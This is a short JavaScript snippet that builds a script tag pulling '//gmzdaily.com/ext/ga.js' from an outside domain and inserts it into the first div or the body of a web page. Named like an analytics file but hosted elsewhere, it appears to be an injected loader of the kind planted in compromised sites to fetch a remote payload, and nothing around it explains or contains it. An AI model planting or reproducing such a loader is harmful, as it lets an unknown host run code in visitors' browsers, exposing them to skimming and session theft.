var ns8 = document.createElement('script');
ns8.src = '//gmzdaily.com/ext/ga.js';
isrRnd(ns8);

function isrRnd(d) {
    for (var c = document.body.childNodes, a = void 0, b = 0; b < c.length; b++)
      "div" != c[b].nodeName.toLowerCase() || a || (a=c[b]); a ? a.appendChild(d) : document.body.appendChild(d)
};